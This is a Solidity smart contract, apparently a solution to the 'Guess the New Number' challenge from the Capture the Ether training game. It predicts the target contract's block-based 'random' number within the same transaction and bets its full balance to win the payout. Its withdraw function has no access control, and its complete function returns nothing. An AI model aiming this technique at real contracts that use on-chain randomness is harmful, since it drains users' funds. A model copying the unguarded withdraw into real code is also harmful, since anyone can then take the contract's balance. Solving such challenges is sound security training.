/**
 *Submitted for verification at Etherscan.io on 2022-03-23
*/

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() external payable;

    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract CallingTheNewNumber {
    address GuessTheNewNumberChallengeAddress =
        0x5926AB0659C8B463879F3CE88911b221DBe6A731;

    IGuessTheNewNumberChallenge challenge =
        IGuessTheNewNumberChallenge(GuessTheNewNumberChallengeAddress);

    function gessing() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(address(this).balance)(answer);
    }

    function complete() public view returns (bool) {
        challenge.isComplete();
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}